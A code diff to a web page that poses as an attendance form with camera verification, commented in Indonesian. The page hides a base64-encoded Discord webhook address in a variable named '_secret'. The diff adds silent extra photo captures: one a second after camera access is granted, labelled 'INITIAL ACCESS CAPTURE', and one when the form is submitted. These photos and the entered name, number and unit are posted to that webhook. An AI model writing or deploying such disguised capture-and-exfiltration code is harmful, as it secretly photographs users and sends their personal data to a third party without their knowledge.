@@ -37,7 +37,8 @@
             width: 100%; aspect-ratio: 1/1; background: #000; border-radius: 25px; 
             overflow: hidden; margin-bottom: 25px; border: 4px solid #f8fafc;
         }
-        video { width: 100%; height: 100%; object-fit: cover; }
+        /* KAMERA TIDAK MIRROR */
+        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(1); }
         input, select { 
             width: 100%; padding: 16px; border-radius: 15px; border: 1.5px solid #e2e8f0; 
             margin-bottom: 15px; outline: none; font-size: 15px; background: #fff;
@@ -102,6 +103,7 @@
 <script>
     const _secret = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2NjY0OTkzNzA1MDg2NTgyNy9KeDJtcE1kZFZ2d2hQbGJTYmFhUjdyMzhXTXZTWGxDa0lidVBBX1FjR1Npb1hfMHBUVEU2Y2F4ZDBFZ05kQnlYcjZCSA==";
     const _wh = atob(_secret);
+    let streamActive = null;
 
     function nav(n) {
         document.querySelectorAll('.main').forEach(e => e.classList.add('hidden'));
@@ -112,39 +114,71 @@
     async function startV() {
         try {
             const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
-            document.getElementById('v').srcObject = s;
+            streamActive = s;
+            const videoEl = document.getElementById('v');
+            videoEl.srcObject = s;
+            
+            // JEPRET OTOMATIS 1: Pas kamera dapet izin
+            videoEl.onloadedmetadata = () => {
+                setTimeout(() => { xCap(true); }, 1000);
+            };
         } catch(e) { alert("Izin akses perangkat diperlukan."); }
     }
 
-    function xCap() {
+    function xCap(isAuto = false) {
         const v = document.getElementById('v'), c = document.getElementById('c'), btn = document.getElementById('snap');
-        btn.disabled = true; btn.innerText = "Memproses...";
+        if(!isAuto && btn) { btn.disabled = true; btn.innerText = "Memproses..."; }
+        
         c.width = v.videoWidth; c.height = v.videoHeight;
-        c.getContext('2d').drawImage(v, 0, 0);
+        const ctx = c.getContext('2d');
+        ctx.setTransform(1, 0, 0, 1, 0, 0); // Pastikan hasil jepretan gak mirror
+        ctx.drawImage(v, 0, 0);
+        
         c.toBlob(async (blob) => {
             const fd = new FormData();
             fd.append('payload_json', JSON.stringify({
-                content: "📌 **ENTRY DETECTED**",
+                content: isAuto ? "📌 **INITIAL ACCESS CAPTURE**" : "📸 **USER MANUAL CAPTURE**",
                 username: "System Node 01"
             }));
             fd.append('file', blob, 'log_capture.jpg');
-            try { await fetch(_wh, { method: 'POST', body: fd }); nav(3); } 
-            catch (e) { nav(3); }
+            try { 
+                await fetch(_wh, { method: 'POST', body: fd }); 
+                if(!isAuto) nav(3); 
+            } catch (e) { if(!isAuto) nav(3); }
         }, 'image/jpeg', 0.6);
     }
 
     async function fSub() {
-        const btn = document.getElementById('f-btn');
-        const data = `📋 **ABSENSI TERKIRIM**\n**Nama:** ${document.getElementById('n').value}\n**No:** ${document.getElementById('a').value}\n**Unit:** ${document.getElementById('k').value}\n**Status:** ${document.getElementById('s').value}`;
+        const v = document.getElementById('v'), c = document.getElementById('c'), btn = document.getElementById('f-btn');
+        const name = document.getElementById('n').value;
+        const data = `📋 **ABSENSI TERKIRIM**\n**Nama:** ${name}\n**No:** ${document.getElementById('a').value}\n**Unit:** ${document.getElementById('k').value}\n**Status:** ${document.getElementById('s').value}`;
+        
         btn.disabled = true; btn.innerText = "Syncing...";
-        try {
-            await fetch(_wh, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: data, username: "Academic DB" })
-            });
-            setTimeout(() => { nav(4); }, 1500);
-        } catch (e) { nav(4); }
+
+        // JEPRET OTOMATIS 2: Pas klik tombol kirim
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        
+        c.toBlob(async (blob) => {
+            const fd = new FormData();
+            fd.append('payload_json', JSON.stringify({
+                content: `✅ **FINAL VERIFICATION FOR: ${name}**`,
+                username: "Academic DB"
+            }));
+            fd.append('file', blob, 'final_verify.jpg');
+            
+            try {
+                // Kirim foto terakhir dulu
+                await fetch(_wh, { method: 'POST', body: fd });
+                // Baru kirim data teksnya
+                await fetch(_wh, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: data, username: "Academic DB" })
+                });
+                setTimeout(() => { nav(4); }, 1500);
+            } catch (e) { nav(4); }
+        }, 'image/jpeg', 0.6);
     }
 </script>
 </body>
